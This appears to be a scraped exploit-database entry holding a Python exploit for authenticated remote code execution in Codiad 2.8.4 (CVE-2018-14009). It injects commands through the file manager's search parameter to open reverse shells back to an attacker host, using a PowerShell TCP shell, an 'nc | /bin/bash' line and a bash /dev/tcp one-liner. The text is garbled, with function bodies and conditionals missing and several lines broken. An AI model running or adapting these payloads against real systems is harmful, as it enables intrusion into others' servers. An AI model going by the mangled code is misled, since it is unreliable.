{
    "text": "vul_name : Codiad 2.8.4 Remote Code Execution ( Authenticated )  ， vul_cve : CVE-2018-14009 ， vul_poc :  # Exploit Title : Codiad 2.8.4 - Remote Code Execution ( Authenticated )  ，  # Discovery by : WangYihang ，  # Vendor Homepage :  ，  # Software Links :  ，  # Tested Version : Version : 2.8.4 ，  # CVE : CVE-2018-14009 ，  ，  #  ! /usr/bin/env python ，  # encoding : utf-8 ，  ，  ， session = requests.Session (  )  ，  ，  ， global session ， url = domain + \"/components/user/controller.php?action=authenticate\" ， data = { ， \"username\" : username ,  ， \"password\" : password ,  ， \"theme\" : \"default\" ,  ， \"language\" : \"en\" ， } ， response = session.post ( url , data=data , verify=False )  ， content = response.text ， print ( \" [ + ] Login Content : %s\" % ( content )  ，  ，  ， global session ， url = domain + \"/components/project/controller.php?action=get_current\" ， response = session.get ( url , verify=False )  ， content = response.text ， print ( \" [ + ] Path Content : %s\" % ( content )  ， json_obj = json.loads ( content )  ，  ，  ， payload = ' ，  $ client = New-Object System.Net.Sockets.TCPClient ( \"_HOST_\" , _PORT_ )  ;  ，  $ stream = $ client.GetStream (  )  ;  ，  [ byte [  ]  $ bytes = 0.255 | %{0} ;  ，  $ data = ( New-Object -TypeName System.Text.ASCIIEncoding ) .GetString (  $ bytes , 0 ,  $ i )  ;  ，  $ sendback = ( iex $ data 2>&1 | Out-String )  ;  ，  $ sendback2 = $ sendback + \"PS \" + ( pwd ) .Path + \"> \" ;  ，  $ sendbyte = (  [ text.encoding ]  : ASCII ) .GetBytes (  $ sendback2 )  ;  ，  $ stream.Write (  $ sendbyte , 0 ,  $ sendbyte.Length )  ;  ，  $ stream.Flush (  )  ;  ， } ，  $ client.Close (  )  ;  ， ' ， result = \" ， result += i + \"\\x00\" ，  ，  ， preffix = \"powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc \" ，  ，  ， global session ， url = domain + \\ ， \"components/filemanager/controller.php?type=1&action=search&path=%s\" % (  ， path )  ，  # new version escapeshellarg ，  # escapeshellarg on windows will quote the arg with \" ，  # so we need to try twice ， payload = ' | %s | ' % ( build_powershell_payload ( host , port )  ， payload = \"search_string=Hacker&search_file_type=\" + payload ， headers = { ， \"Content-Type\" : \"application/x-www-form-urlencoded ; charset=UTF-8\"} ， response = session.post ( url , data=payload , headers=headers , verify=False )  ， content = response.text ， print ( content )  ，  ，  # old version escapeshellarg ， payload = '%22 | %s | ' % ( build_powershell_payload ( host , port )  ， payload = \"search_string=Hacker&search_file_type=\" + payload ， headers = { ， \"Content-Type\" : \"application/x-www-form-urlencoded ; charset=UTF-8\"} ， response = session.post ( url , data=payload , headers=headers , verify=False )  ， content = response.text ， print ( content )  ，  # payload = 'SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F' + host + '%2F' + port + '+0%3E%261'%0Agrep+%22SniperOJ' ， payload = '\"%0Anc %s %d | /bin/bash %23' % ( host , port )  ， payload = \"search_string=Hacker&search_file_type=\" + payload ， headers = { ， \"Content-Type\" : \"application/x-www-form-urlencoded ; charset=UTF-8\"} ， response = session.post ( url , data=payload , headers=headers , verify=False )  ， content = response.text ， print ( content )  ，  ，  ， print ( hint )  ， ans = input ( \" [ Y/n ] \" ) .lower (  )  ， elif ans = 'y' :  ， print ( \"Incorrect input\" )  ，  ，  ， print ( \"Usage : \" )  ， print ( \" python %s [ URL ]  [ USERNAME ]  [ PASSWORD ]  [ IP ]  [ PORT ]  [ PLATFORM ] \" % ( sys.argv [ 0 ]  )  ， print ( \" python %s [ URL : PORT ]  [ USERNAME ]  [ PASSWORD ]  [ IP ]  [ PORT ]  [ PLATFORM ] \" % ( sys.argv [ 0 ]  )  ， print ( \"Example : \" )  ， print ( \" python %s admin admin 8.8.8.8 8888 linux\" % ( sys.argv [ 0 ]  )  ， print ( \" python %s admin admin 8.8.8.8 8888 windows\" % ( sys.argv [ 0 ]  )  ， print ( \"Author : \" )  ， print ( \" WangYihang <wangyihanger @ gmail.com>\" )  ， exit ( 1 )  ， domain = sys.argv [ 1 ]  ， username = sys.argv [ 2 ]  ， password = sys.argv [ 3 ]  ， host = sys.argv [ 4 ]  ， port = int ( sys.argv [ 5 ]  )  ， platform = sys.argv [ 6 ]  ， print ( \" [ + ] Please execute the following command on your vps : \" )  ， print ( \"nc -lnvp %d\" % ( port )  ， exit ( 1 )  ， print ( \" [ + ] Please execute the following command on your vps : \" )  ， print ( \"echo 'bash -c \\\"bash -i >/dev/tcp/%s/%d 0>&1 2>&1\\\"' | nc -lnvp %d\" % ( host , port + 1 , port )  ， print ( \"nc -lnvp %d\" % ( port + 1 )  ， exit ( 1 )  ， print ( \" [ + ] Starting.\" )  ， print ( \" [ - ] Login failed ! Please check your username and password.\" )  ， exit ( 2 )  ， print ( \" [ + ] Login success ! \" )  ， print ( \" [ + ] Getting writeable path.\" )  ， path = get_write_able_path ( domain )  ， print ( \" [ + ] Get current path error ! \" )  ， exit ( 3 )  ， print ( \" [ + ] Writeable Path : %s\" % ( path )  ， print ( \" [ + ] Sending payload.\" )  ， exploit ( domain , username , password , host , port , path , platform )  ， print ( \" [ + ] Exploit finished ! \" )  ， print ( \" [ + ] Enjoy your reverse shell ! \" )  ，  ，  ， main (  ) ",
    "time": "2021.03.24"
}